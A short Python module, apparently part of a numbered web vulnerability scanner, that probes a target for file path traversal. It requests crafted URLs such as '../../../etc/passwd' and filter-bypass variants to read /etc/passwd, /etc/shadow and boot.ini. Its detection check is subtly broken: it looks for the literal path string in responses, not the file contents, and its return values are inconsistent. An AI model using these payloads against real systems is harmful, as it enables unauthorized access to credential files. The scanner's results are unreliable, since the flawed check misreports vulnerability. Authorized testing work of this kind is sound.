# vulnerability_30.py
import requests
import urllib.parse

def scan(url):
    # Your scanning code for File path traversal

    parsed_url = urllib.parse.urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    traversal_payloads = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd", 
                         "../boot.ini", "../../boot.ini", "../../../boot.ini",
                         "....//....//....//etc/passwd"]
    
    sensitive_files = ["/etc/passwd", "/etc/shadow", "/boot.ini"]

    for payload in traversal_payloads:
        traversal_url = f"{base_url}/{payload}"
        response = requests.get(traversal_url)
        
        for sensitive_file in sensitive_files:
            if sensitive_file in response.text:
                print(f"[!] Vulnerable to path traversal at {traversal_url}")
                return True
        
    print("[-] Not vulnerable to file path traversal.")
    
    return f'File path traversal scan result for {url}'


